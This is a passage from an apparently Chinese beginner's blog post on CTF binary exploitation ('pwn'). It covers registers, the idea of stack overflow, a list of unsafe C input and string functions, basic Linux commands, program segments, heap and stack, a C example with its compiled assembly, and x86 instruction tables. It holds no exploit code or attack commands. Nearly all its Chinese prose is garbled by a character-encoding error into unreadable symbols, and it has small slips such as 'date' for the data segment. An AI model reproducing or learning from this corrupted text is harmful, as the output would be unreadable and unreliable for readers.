ä¸­å‘ç°æ¼æ´ï¼Œå†é€šè¿‡äºŒè¿›åˆ¶æˆ–ç³»ç»Ÿè°ƒç”¨ç­‰æ–¹å¼åˆ©ç”¨è¿™äº›æ¼æ´è·å¾—ç›®æ ‡ä¸»æœºçš„shell ã€‚</p><p>å¾ˆé…·ï¼ï¼ï¼ï¼ï¼ğŸ˜</p><h1 id="å‰çŸ¥çŸ¥è¯†"><a href="#å‰çŸ¥çŸ¥è¯†" class="headerlink" title="å‰çŸ¥çŸ¥è¯†"></a>å‰çŸ¥çŸ¥è¯†</h1><p>å°±æ˜¯æˆ‘åªçŸ¥é“è¿™ä¹ˆå¤šå°±æ¥å­¦pwnäº†</p><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><p>å¯„å­˜å™¨æ˜¯CPUå†…éƒ¨ç”¨æ¥å­˜æ”¾æ•°æ®çš„ä¸€äº›å°å‹å­˜å‚¨åŒºåŸŸï¼Œç”¨æ¥æš‚æ—¶å­˜æ”¾å‚ä¸è¿ç®—çš„æ•°æ®å’Œè¿ç®—ç»“æœã€‚</p><p>æˆ‘ä»¬å¸¸å¸¸çœ‹åˆ° 32ä½ CPUã€64ä½ CPU è¿™æ ·çš„åç§°ï¼Œå…¶å®æŒ‡çš„å°±æ˜¯å¯„å­˜å™¨çš„å¤§å°ã€‚</p><p>Intel 32ä½ä½“ç³»ç»“æ„(ç®€ç§°IA32)å¤„ç†å™¨åŒ…å«8ä¸ªå››å­—èŠ‚å¯„å­˜å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/271639137915732.jpg"></p><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸Šå›¾æ‰€ç¤ºçš„å‰6ä¸ªå¯„å­˜å™¨å‡å¯ä½œä¸ºé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ã€‚</p><p>ç¼–è¯‘å™¨ä¼šæ ¹æ®æ“ä½œæ•°å¤§å°é€‰æ‹©åˆé€‚çš„å¯„å­˜å™¨æ¥ç”Ÿæˆæ±‡ç¼–ä»£ç ã€‚åœ¨æ±‡ç¼–è¯­è¨€å±‚é¢ï¼Œè¿™ç»„é€šç”¨å¯„å­˜å™¨ä»¥%e(AT&amp;Tè¯­æ³•)æˆ–ç›´æ¥ä»¥e(Intelè¯­æ³•)å¼€å¤´æ¥å¼•ç”¨.</p><p>ä¾‹å¦‚<code>mov $5, %eax</code>æˆ–<code>mov eax, 5</code>è¡¨ç¤ºå°†5èµ‹å€¼ç»™å¯„å­˜å™¨<strong>eax</strong>ã€‚</p><p> ä¸åŒæ¶æ„çš„CPUï¼Œå¯„å­˜å™¨åç§°è¢«æ·»åŠ ä¸åŒå‰ç¼€ä»¥æŒ‡ç¤ºå¯„å­˜å™¨çš„å¤§å°ã€‚ä¾‹å¦‚x86æ¶æ„ç”¨å­—æ¯<strong>â€œeâ€</strong>ä½œåç§°å‰ç¼€ï¼ŒæŒ‡ç¤ºå¯„å­˜å™¨å¤§å°ä¸º32ä½ï¼›x86_64æ¶æ„ç”¨å­—æ¯<strong>â€œrâ€</strong>ä½œåç§°å‰ç¼€ï¼ŒæŒ‡ç¤ºå„å¯„å­˜å™¨å¤§å°ä¸º64ä½ã€‚</p><h3 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h3><p>æ ˆæº¢å‡ºå°±æ˜¯æ•°æ®ä¼šå ç”¨ä¸€ä¸ªå­˜å‚¨ç©ºé—´ï¼Œä½†æ˜¯æˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™é»˜è®¤è¾“å…¥æ•°æ®å°±æ˜¯ç¬¦åˆè§„å®šçš„æ•°æ®ï¼Œå¹¶æ²¡æœ‰å¯¹è¾“å…¥æ•°æ®è¿›è¡Œé™åˆ¶ï¼Œè¿™æ—¶è¶…å‡ºè¿™ä¸ªç©ºé—´å¤§å°çš„æ•°æ®å°±ä¼šè¾“å…¥åˆ°åˆæ³•ç©ºé—´ä»¥å¤–çš„åœ°æ–¹å¹¶é€ æˆç ´åã€‚</p><p>å€Ÿæ­¤æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªä¸å…è®¸ç”¨æˆ·æ“ä½œçš„ç©ºé—´å†…çš„å¯„å­˜å™¨ï¼Œæ”¹å˜å¯„å­˜å™¨çš„å€¼è¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœã€‚</p><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œæˆ‘ä»¬å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½æœ‰æ ˆæº¢å‡ºï¼Œä»¥åŠæœ‰çš„è¯ï¼Œæ ˆæº¢å‡ºçš„ä½ç½®åœ¨å“ªé‡Œã€‚å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><p>è¾“å…¥ï¼š</p><ul><li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥â€™\x00â€™</li><li>scanf</li><li>vscanf</li></ul><p>è¾“å‡ºï¼š</p><ul><li>sprintf</li></ul><p>å­—ç¬¦ä¸²ï¼š</p><ul><li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</li><li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°â€™\x00â€™åœæ­¢</li><li>bcopy</li></ul><h3 id="Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤"><a href="#Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤" class="headerlink" title="Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤"></a>Linuxçš„ä¸€äº›åŸºç¡€å‘½ä»¤</h3><p><code>sudo</code> ï¼šSuperUserDo åœ¨éœ€è¦æƒé™çš„å‘½ä»¤å‰ä½¿ç”¨</p><p><code>apt-get</code>ï¼šå¯ä»¥æ‰§è¡Œå®‰è£…ã€å‡çº§ã€ç”šè‡³ç§»é™¤è½¯ä»¶è¿™ç±»ä»»åŠ¡</p><p><code>grep</code>ï¼šé…åˆæ­£åˆ™è¡¨è¾¾å¼é£Ÿç”¨ï¼Œç”¨äºå¯»æ‰¾æ–‡ä»¶æˆ–å†…å®¹</p><p><code>cat</code>ï¼šæŸ¥çœ‹æ–‡ä»¶</p><p><code>rm</code>ï¼šç§»é™¤æ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨**-r**æ¥è¿›è¡Œé€’å½’ç§»é™¤ï¼Œä»è€Œç§»é™¤æ•´ä¸ªæ–‡ä»¶å¤¹</p><p><code>cp</code>ï¼šæ‹·è´æ–‡ä»¶</p><p><code>ls</code>ï¼šæŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><del>æš‚æ—¶åªæƒ³èµ·è¿™ä¹ˆå¤š</del></p><h1 id="æ±‡ç¼–åŸºç¡€"><a href="#æ±‡ç¼–åŸºç¡€" class="headerlink" title="æ±‡ç¼–åŸºç¡€"></a>æ±‡ç¼–åŸºç¡€</h1><blockquote><p>pwn ç ”ç©¶äºŒè¿›åˆ¶è¿˜æ˜¯è¦å­¦ä¹ åº•å±‚è®¡ç®—æœºè¯­è¨€çš„ğŸ˜¢</p></blockquote><p>æ±‡ç¼–è¯­è¨€æ˜¯äºŒè¿›åˆ¶æŒ‡ä»¤çš„æ–‡æœ¬å½¢å¼ï¼Œä¸æŒ‡ä»¤æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚æ¯”å¦‚ï¼ŒåŠ æ³•æŒ‡ä»¤<code>00000011</code>å†™æˆæ±‡ç¼–è¯­è¨€å°±æ˜¯ <code>ADD</code>ã€‚</p><h3 id="å †å’Œæ ˆ"><a href="#å †å’Œæ ˆ" class="headerlink" title="å †å’Œæ ˆ"></a>å †å’Œæ ˆ</h3><h4 id="æ®µ"><a href="#æ®µ" class="headerlink" title="æ®µ"></a>æ®µ</h4><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç¨‹åºéƒ½æ˜¯ç”±bssæ®µï¼Œtextæ®µå’Œdateæ®µä¸‰ä¸ªæ®µç»„æˆã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/11.png"></p><p>bss æ®µï¼šåªæœ‰å®šä¹‰è€Œæ²¡æœ‰èµ‹åˆå€¼çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ã€‚</p><p>data æ®µï¼šå­˜æ”¾åœ¨ç¼–è¯‘é˜¶æ®µ (è€Œéè¿è¡Œæ—¶) å°±èƒ½ç¡®å®šçš„æ•°æ®ï¼Œå¯è¯»å¯å†™ã€‚å°±æ˜¯é€šå¸¸æ‰€è¯´çš„<strong>é™æ€å­˜å‚¨åŒº</strong>ï¼Œå­˜å‚¨èµ‹äº†åˆå€¼çš„å…¨å±€å˜é‡å’Œèµ‹åˆå€¼çš„é™æ€å˜é‡ä»¥åŠå¸¸é‡ã€‚</p><p>text æ®µï¼šæ”¾<strong>ç¨‹åºä»£ç </strong>ï¼Œåœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œåªè¯»ã€‚</p><h5 id="bssæ®µ"><a href="#bssæ®µ" class="headerlink" title=".bssæ®µ"></a>.bssæ®µ</h5><p>bssæ®µæ˜¯ç”¨æ¥å­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œä¸€èˆ¬åœ¨åˆå§‹åŒ–æ—¶bssæ®µéƒ¨åˆ†ä¼šæ¸…é›¶ã€‚</p><h5 id="textæ®µ"><a href="#textæ®µ" class="headerlink" title=".textæ®µ"></a>.textæ®µ</h5><p>å­˜æ”¾ç¨‹åºä»£ç çš„åŒºåŸŸï¼Œåœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œåªè¯»ã€‚</p><p>æ›´è¿›ä¸€æ­¥è®²æ˜¯å­˜æ”¾å¤„ç†å™¨çš„æœºå™¨æŒ‡ä»¤ï¼Œå½“å„ä¸ªæºæ–‡ä»¶å•ç‹¬ç¼–è¯‘ä¹‹åç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼Œç»è¿æ¥å™¨è¿æ¥å„ä¸ªç›®æ ‡æ–‡ä»¶å¹¶è§£å†³å„ä¸ªæºæ–‡ä»¶ä¹‹é—´çš„å‡½æ•°å¼•ç”¨ã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿˜è¦å°†æ‰€æœ‰ç›®æ ‡æ–‡ä»¶ä¸­çš„.textæ®µåˆåœ¨ä¸€èµ·ï¼Œä½†ä¸æ˜¯ç®€å•çš„å°†ä»–ä»¬â€œå †â€åœ¨ä¸€èµ·ï¼Œè¿˜è¦å¤„ç†å„ä¸ªæ®µä¹‹é—´å‡½æ•°å¼•ç”¨é—®é¢˜ã€‚</p><h5 id="dateæ®µ"><a href="#dateæ®µ" class="headerlink" title=".dateæ®µ"></a>.dateæ®µ</h5><p>ç”¨äºå­˜æ”¾åœ¨ç¼–è¯‘é˜¶æ®µï¼ˆè€Œéè¿è¡Œæ—¶ï¼‰å°±èƒ½ç¡®å®šçš„æ•°æ®ï¼Œå¯è¯»å¯å†™ã€‚ä¹Ÿæ˜¯é€šå¸¸æ‰€è¯´çš„é™æ€å­˜å‚¨åŒºï¼Œèµ‹äº†åˆå€¼çš„å…¨å±€å˜é‡ï¼Œå¸¸é‡å’Œé™æ€å˜é‡éƒ½å­˜æ”¾åœ¨è¿™ä¸ªåŒºåŸŸã€‚</p><h4 id="Heap-å †"><a href="#Heap-å †" class="headerlink" title="Heap-å †"></a>Heap-å †</h4><p>ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç»™å®ƒåˆ†é…ä¸€æ®µå†…å­˜ï¼Œç”¨æ¥å‚¨å­˜ç¨‹åºå’Œè¿è¡Œäº§ç”Ÿçš„æ•°æ®ã€‚è¿™æ®µå†…å­˜æœ‰èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼Œæ¯”å¦‚ä»<code>0x1000</code>åˆ°<code>0x8000</code>ï¼Œèµ·å§‹åœ°å€æ˜¯è¾ƒå°çš„é‚£ä¸ªåœ°å€(ä½ä½ï¼‰ï¼Œç»“æŸåœ°å€æ˜¯è¾ƒå¤§çš„é‚£ä¸ªåœ°å€ï¼ˆé«˜ä½ï¼‰ã€‚</p><p>ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¹äºåŠ¨æ€çš„å†…å­˜å ç”¨è¯·æ±‚ï¼ˆæ¯”å¦‚æ–°å»ºå¯¹è±¡ï¼Œæˆ–è€…ä½¿ç”¨<code>malloc</code>å‘½ä»¤ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šä»é¢„å…ˆåˆ†é…å¥½çš„é‚£æ®µå†…å­˜ä¹‹ä¸­ï¼Œåˆ’å‡ºä¸€éƒ¨åˆ†ç»™ç”¨æˆ·ï¼Œå…·ä½“è§„åˆ™æ˜¯ä»èµ·å§‹åœ°å€å¼€å§‹åˆ’åˆ†ã€‚</p><blockquote><p>å®é™…ä¸Šï¼Œèµ·å§‹åœ°å€ä¼šæœ‰ä¸€æ®µé™æ€æ•°æ®ï¼Œè¿™é‡Œå¿½ç•¥</p></blockquote><p>ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è¦æ±‚å¾—åˆ°10ä¸ªå­—èŠ‚å†…å­˜ï¼Œé‚£ä¹ˆä»èµ·å§‹åœ°å€<code>0x1000</code>å¼€å§‹ç»™ä»–åˆ†é…ï¼Œä¸€ç›´åˆ†é…åˆ°åœ°å€<code>0x100A</code>ï¼Œå¦‚æœå†è¦æ±‚å¾—åˆ°22ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±åˆ†é…åˆ°<code>0x1020</code>ã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-38-37.png"></p><p>è¿™ç§å› ä¸ºç”¨æˆ·ä¸»åŠ¨è¯·æ±‚è€Œåˆ’åˆ†å‡ºæ¥çš„å†…å­˜åŒºåŸŸï¼Œå°±å«åš Heapï¼ˆå †ï¼‰ã€‚å®ƒç”±<strong>èµ·å§‹åœ°å€</strong>å¼€å§‹ï¼Œä»<strong>ä½ä½</strong>å‘<strong>é«˜ä½</strong>å¢é•¿ã€‚Heap çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯<strong>ä¸ä¼šè‡ªåŠ¨æ¶ˆå¤±</strong>ï¼Œå¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ï¼Œæˆ–è€…ç”±åƒåœ¾å›æ”¶æœºåˆ¶æ¥å›æ”¶ã€‚</p><h4 id="Strack-æ ˆ"><a href="#Strack-æ ˆ" class="headerlink" title="Strack-æ ˆ"></a>Strack-æ ˆ</h4><p>Stack æ˜¯ç”±äºå‡½æ•°è¿è¡Œè€Œä¸´æ—¶å ç”¨çš„å†…å­˜åŒºåŸŸã€‚Stack æ˜¯ç”±å†…å­˜åŒºåŸŸçš„<strong>ç»“æŸåœ°å€</strong>å¼€å§‹ï¼Œä»<strong>é«˜ä½</strong>å‘<strong>ä½ä½</strong>åˆ†é…ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚</p><p>æ¯”å¦‚ï¼Œå†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€æ˜¯<code>0x8000</code>ï¼Œç¬¬ä¸€å¸§å‡å®šæ˜¯16å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆ†é…çš„åœ°å€å°±ä¼šä»<code>0x7FF0</code>å¼€å§‹ï¼›ç¬¬äºŒå¸§å‡å®šéœ€è¦64å­—èŠ‚ï¼Œé‚£ä¹ˆåœ°å€å°±ä¼šç§»åŠ¨åˆ°<code>0x7FB0</code>ã€‚</p><p>ä¸¾ä¸ªå…·ä½“çš„ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> add_a_and_b(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç³»ç»Ÿå¼€å§‹æ‰§è¡Œ<code>main</code>å‡½æ•°æ—¶ï¼Œä¼šä¸ºå®ƒåœ¨å†…å­˜é‡Œé¢å»ºç«‹ä¸€ä¸ªå¸§ï¼ˆframeï¼‰ï¼Œæ‰€æœ‰<code>main</code>çš„å†…éƒ¨å˜é‡ï¼ˆæ¯”å¦‚aå’Œbï¼‰éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¸§é‡Œé¢ã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-50-18.png"></p><p>å½“è°ƒç”¨å…¶ä»–å‡½æ•°æ—¶ï¼Œç¨‹åºè¿è¡Œåˆ°è¿™ä¸€è¡Œï¼Œä¼šæ–°å»ºä¸€ä¸ªå¸§ã€‚æ­¤æ—¶å­˜åœ¨ä¸¤ä¸ªå¸§ï¼š<code>main</code>å’Œ<code>add_a_and_b</code>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè°ƒç”¨æ ˆæœ‰å¤šå°‘å±‚ï¼Œå°±æœ‰å¤šå°‘å¸§ã€‚</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-49-52.png"></p><p>ç­‰åˆ°<code>add_a_and_b</code>è¿è¡Œç»“æŸï¼Œå®ƒçš„å¸§å°±ä¼šè¢«å›æ”¶ï¼Œç³»ç»Ÿä¼šå›åˆ°å‡½æ•°<code>main</code>åˆšæ‰ä¸­æ–­æ‰§è¡Œçš„åœ°æ–¹ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚</p><p>ç”Ÿæˆæ–°çš„å¸§ï¼Œå«åšâ€å‹æ ˆâ€ï¼Œè‹±æ–‡æ˜¯ pushï¼›æ ˆçš„å›æ”¶å«åšâ€å‡ºæ ˆâ€ï¼Œè‹±æ–‡æ˜¯ popã€‚Stack çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œæœ€æ™šå…¥æ ˆçš„å¸§æœ€æ—©å‡ºæ ˆï¼ˆå› ä¸ºæœ€å†…å±‚çš„å‡½æ•°è°ƒç”¨ï¼Œæœ€å…ˆç»“æŸè¿è¡Œï¼‰ï¼Œè¿™å°±å«åšâ€<strong>åè¿›å…ˆå‡º</strong>â€œçš„æ•°æ®ç»“æ„ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå°±å®ç°äº†å‡½æ•°çš„å±‚å±‚è°ƒç”¨ï¼Œå¹¶ä¸”æ¯ä¸€å±‚éƒ½èƒ½ä½¿ç”¨è‡ªå·±çš„æœ¬åœ°å˜é‡ã€‚</p><h4 id="ä¸€ä¸ªğŸŒ°"><a href="#ä¸€ä¸ªğŸŒ°" class="headerlink" title="ä¸€ä¸ªğŸŒ°"></a>ä¸€ä¸ªğŸŒ°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_a_and_b</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>   <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-keyword">return</span> add_a_and_b(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†å…¶è½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86">.file&quot;test.c&quot;<br>.text<br>.globladd_a_and_b<br>.typeadd_a_and_b, @function<br>add_a_and_b:<br>.LFB0:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl%edi, -4(%rbp)<br>movl%esi, -8(%rbp)<br>movl-4(%rbp), %edx<br>movl-8(%rbp), %eax<br>addl%edx, %eax<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizeadd_a_and_b, .-add_a_and_b<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB1:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl$3, %esi<br>movl$2, %edi<br>calladd_a_and_b<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE1:<br>.sizemain, .-main<br>.ident&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><blockquote><p>ä»¥æˆ‘ç°åœ¨çš„æ°´å¹³è¿˜ä¸æ˜¯å¾ˆèƒ½çœ‹æ˜ç™½ï¼Œæˆ‘å°±æ˜¯æŠŠæ–‡ä»¶å…¨å¤åˆ¶ä¸‹æ¥äº†</p></blockquote><p>ç®€åŒ–ä»¥åä¸»è¦å°±æ˜¯è¿™äº›å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86">_add_a_and_b:<br>   push   %ebx<br>   mov    %eax, [%esp+8] <br>   mov    %ebx, [%esp+12]<br>   add    %eax, %ebx <br>   pop    %ebx <br>   ret  <br><br>_main:<br>   push   3<br>   push   2<br>   call   _add_a_and_b <br>   add    %esp, 8<br>   ret<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŸç¨‹åºä¸¤ä¸ªå‡½æ•°<code>add_a_and_b</code>å’Œ<code>main</code>å¯¹åº”ä¸Šé¢çš„ä¸¤ä¸ªæ ‡ç­¾<code>_add_a_and_b</code>å’Œ<code>_main</code>ï¼Œæ¯ä¸ªæ ‡ç­¾é‡Œé¢æ˜¯è¯¥å‡½æ•°æ‰€è½¬æˆçš„ CPU è¿è¡Œæµç¨‹ï¼Œæ¯ä¸€è¡Œå°±æ˜¯ CPU æ‰§è¡Œçš„ä¸€æ¬¡æ“ä½œã€‚</p><p>ä»¥å…¶ä¸­ä¸€è¡Œä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86">push   %ebx<br></code></pre></td></tr></table></figure><p>è¿™ä¸€è¡Œé‡Œé¢ï¼Œ<code>push</code>æ˜¯ CPU æŒ‡ä»¤ï¼Œ<code>%ebx</code>æ˜¯è¯¥æŒ‡ä»¤è¦ç”¨åˆ°çš„è¿ç®—å­ã€‚ä¸€ä¸ª CPU æŒ‡ä»¤å¯ä»¥æœ‰é›¶ä¸ªåˆ°å¤šä¸ªè¿ç®—å­ã€‚</p><h4 id="åŸºç¡€æŒ‡ä»¤"><a href="#åŸºç¡€æŒ‡ä»¤" class="headerlink" title="åŸºç¡€æŒ‡ä»¤"></a>åŸºç¡€æŒ‡ä»¤</h4><table><thead><tr><th>æ±‡ç¼–æŒ‡ä»¤</th><th>å®é™…ä½œç”¨</th><th>ç­‰ä»·ä»£ç </th></tr></thead><tbody><tr><td>mov rax,rbx</td><td>ç”¨äºèµ‹å€¼</td><td>rax&#x3D;rbx</td></tr><tr><td>add&#x2F;sub rax,rbx</td><td>ç”¨äºåŠ &#x2F;å‡æ³•</td><td>rax+&#x3D;rbx&#x2F;rax-&#x3D;rbx</td></tr><tr><td>and&#x2F;xor&#x2F;or rax,rbx</td><td>ç”¨äºä¸&#x2F;å¼‚æˆ–&#x2F;æˆ–</td><td>rax&amp;&#x3D;rbx&#x2F;rax^&#x3D;rbx&#x2F;rax</td></tr><tr><td>push rax</td><td>å‹æ ˆ</td><td>rsp-&#x3D;8;*rsp&#x3D;rax</td></tr><tr><td>pop rax</td><td>å‡ºæ ˆ</td><td>rax&#x3D;*rsp;rsp+&#x3D;8</td></tr><tr><td>call rax</td><td>è°ƒç”¨å‡½æ•°</td><td>push rip;jmp rax;</td></tr><tr><td>ret</td><td>ä»å‡½æ•°è¿”å›</td><td>pop rip;</td></tr><tr><td>cmp rax,rbx</td><td>æ¯”è¾ƒä¸¤ä¸ªæ•°ã€‚ä¸ä¿ç•™ç»“æœ,åªä¿®æ”¹flagså¯„å­˜å™¨</td><td>rax-rbx</td></tr><tr><td>test rax,rbx</td><td>æ¯”è¾ƒä¸¤ä¸ªæ•°ã€‚ä¸ä¿ç•™ç»“æœ,åªä¿®æ”¹flagså¯„å­˜å™¨</td><td>rax&amp;rbx</td></tr></tbody></table><h4 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h4><table><thead><tr><th>æ±‡ç¼–æŒ‡ä»¤ç¤ºä¾‹</th><th>è‹±æ–‡å…¨ç§°</th><th>å®é™…ä½œç”¨</th></tr></thead><tbody><tr><td>jmp</td><td>jump</td><td>è·³è½¬</td></tr><tr><td>jz</td><td>jump if zero</td><td>ä¸º0æ—¶è·³è½¬</td></tr><tr><td>jnz</td><td>jump if not zero</td><td>ä¸ä¸ºé›¶æ—¶è·³è½¬</td></tr><tr><td>jg</td><td>jump if greater</td><td>æœ‰ç¬¦å·æ•°å¤§äºè·³è½¬</td></tr><tr><td>jl</td><td>jump if lsee</td><td>æœ‰ç¬¦å·æ•°å°äºè·³è½¬</td></tr></tbody></table><p>è·³è½¬æŒ‡ä»¤ä¸åŒäº mov æŒ‡ä»¤ï¼Œä»–å¯ä»¥ç”¨äºä¿®æ”¹æ®µå¯„å­˜å™¨ csã€ip çš„å€¼ï¼Œä»è€Œä¿®æ”¹ CPU åœ¨å†…å­˜ä¸­æ‰€è¯»å–çš„å†…å®¹çš„åœ°å€ã€‚</p><p><del>è¡¨æ ¼æ˜¯ä»å°å“çš„åšå®¢copyæ¥çš„</del></p><h1 id="Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶"><a href="#Linuxå¸¸ç”¨ä¿æŠ¤æœºåˆ¶" 